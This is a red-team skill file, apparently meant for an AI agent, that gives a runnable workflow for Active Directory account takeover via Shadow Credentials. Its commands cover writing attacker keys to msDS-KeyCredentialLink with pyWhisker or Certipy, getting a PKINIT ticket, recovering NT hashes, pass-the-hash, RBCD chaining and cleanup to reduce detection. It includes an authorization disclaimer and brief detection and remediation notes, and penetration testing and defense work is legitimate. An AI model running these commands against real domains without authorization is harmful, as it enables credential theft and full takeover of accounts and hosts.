---
name: abusing-shadow-credentials-for-privesc
description: Take over Active Directory accounts by writing attacker-controlled public keys to msDS-KeyCredentialLink (Shadow Credentials) with pyWhisker, Whisker, or Certipy, then authenticate via PKINIT to recover the target's NT hash without a password reset.
subdomain: red-teaming
facing: config
mitre_attack:
- T1098.005
nist_csf:
- PR.AA-05
upstream: abusing-shadow-credentials-for-privesc@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing and educational purposes only. Shadow Credentials grant full takeover of the targeted account. Use only against systems you own or are explicitly authorized in writing to test. Unauthorized access is a crime.

## Prerequisites

- Authorized engagement scope including AD credential-access techniques
- Control of principal with write access to target's `msDS-KeyCredentialLink`
- DC running Windows Server 2016+ with PKINIT enabled (domain functional level supporting Key Trust)
- Network reachability to LDAP (389/636) and Kerberos (88) on DC
- Linux attack host with Python 3.8+; install tooling:
  ```bash
  # pyWhisker (from source)
  git clone https://github.com/ShutdownRepo/pywhisker
  cd pywhisker && pip install .
  # Certipy (integrated shadow attack)
  pipx install certipy-ad
  # PKINITtools for manual TGT/NT-hash extraction
  git clone https://github.com/dirkjanm/PKINITtools
  ```

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1098.005 | Account Manipulation: Device Registration | Writing attacker-controlled Key Credential (device key) to `msDS-KeyCredentialLink` to register alternate authentication credential for target account |

## Workflow

### Step 1: Confirm write primitive

List existing Key Credentials on target to verify you have required access. Empty or readable result confirms write access for the `add` step.

```bash
python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "victim" --action "list"
```

### Step 2: Add Shadow Credential with pyWhisker

Generate certificate/key pair and write it into target's `msDS-KeyCredentialLink`. pyWhisker outputs PFX you control.

```bash
python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "victim" --action "add" --filename victim_shadow
# Produces victim_shadow.pfx and prints the PFX password
```
Use Kerberos auth instead of password if you only hold ticket:
```bash
python3 pywhisker.py -d "corp.local" -u "attacker" -k --no-pass \
    --target "victim" --action "add" --filename victim_shadow --use-ldaps
```

### Step 3: Request TGT via PKINIT

Use generated PFX with PKINITtools to obtain Kerberos TGT for target.

```bash
python3 PKINITtools/gettgtpkinit.py \
    -cert-pfx victim_shadow.pfx -pfx-pass <PFX_PASSWORD> \
    corp.local/victim victim.ccache
```

### Step 4: Recover NT hash

Extract target's NT hash from AS-REP using session key from Step 3 (`getnthash.py` reads AS-REP encryption key, displayed by `gettgtpkinit.py`).

```bash
export KRB5CCNAME=victim.ccache
python3 PKINITtools/getnthash.py -key <AS-REP-KEY-FROM-STEP-3> corp.local/victim
# Prints the NT hash for 'victim'
```

### Step 5: One-shot alternative with Certipy

Certipy's `shadow auto` performs add → PKINIT → dump hash → cleanup automatically, which is ideal for computer-account takeover.

```bash
certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip 10.0.0.100 -account 'victim'
# For a computer account, use the sAMAccountName with trailing $
certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip 10.0.0.100 -account 'WS01$'
```

### Step 6: Use recovered credential

Authenticate with NT hash (or TGT) to continue engagement.

```bash
# Pass-the-hash with NetExec
nxc smb 10.0.0.10 -u victim -H <RECOVERED-NT-HASH>
# Or use the TGT directly
export KRB5CCNAME=victim.ccache
nxc smb dc.corp.local -u victim --use-kcache
```

### Step 7: Chain computer takeover into RBCD (optional)

When target is computer, recovered key/hash lets you configure Resource-Based Constrained Delegation to impersonate any user to that host.

```bash
# Set RBCD so attacker-controlled SPN can impersonate to WS01$
impacket-rbcd -delegate-from 'attacker$' -delegate-to 'WS01$' \
    -action write 'corp.local/attacker:Passw0rd!'
```

### Step 8: Clean up

Remove injected Key Credential to restore object and reduce detection footprint.

```bash
# pyWhisker: remove by device-id (printed during add) or clear all you added
python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
    --target "victim" --action "remove" --device-id <DEVICE-ID>
# Certipy shadow auto cleans up automatically; otherwise:
certipy shadow clear -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip 10.0.0.100 -account 'victim'
```

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| pyWhisker | Python LDAP manipulation of msDS-KeyCredentialLink | https://github.com/ShutdownRepo/pywhisker |
| Whisker | Original C# implementation | https://github.com/eladshamir/Whisker |
| Certipy | `shadow auto` end-to-end takeover | https://github.com/ly4k/Certipy |
| PKINITtools | gettgtpkinit / getnthash | https://github.com/dirkjanm/PKINITtools |
| Hacker Recipes | Technique walkthrough & defenses | https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials |

## Detection and Remediation Notes

| Area | Guidance |
|------|----------|
| Detection | Monitor Windows Security Event ID 5136 (directory object modified) for changes to `msDS-KeyCredentialLink`; alert when non-AD-Connect/non-Intune principal writes attribute. |
| Auditing | Enable directory service object change auditing on user/computer OUs. |
| Least privilege | Remove unnecessary `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` ACEs (BloodHound `AddKeyCredentialLink` edge). |
| Mitigation | Where Windows Hello/device registration is unused, restrict who can write Key Credentials and consider tier-0 protected accounts. |

## Validation Criteria

- [ ] Write access over target's `msDS-KeyCredentialLink` confirmed (`list` succeeded)
- [ ] Key Credential successfully added (PFX generated)
- [ ] PKINIT TGT obtained for target account
- [ ] Target NT hash recovered and validated against service
- [ ] (If computer) RBCD chain or onward movement demonstrated
- [ ] Injected Key Credential removed / object restored
- [ ] Enabling ACL path documented with remediation recommendation

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/abusing-shadow-credentials-for-privesc
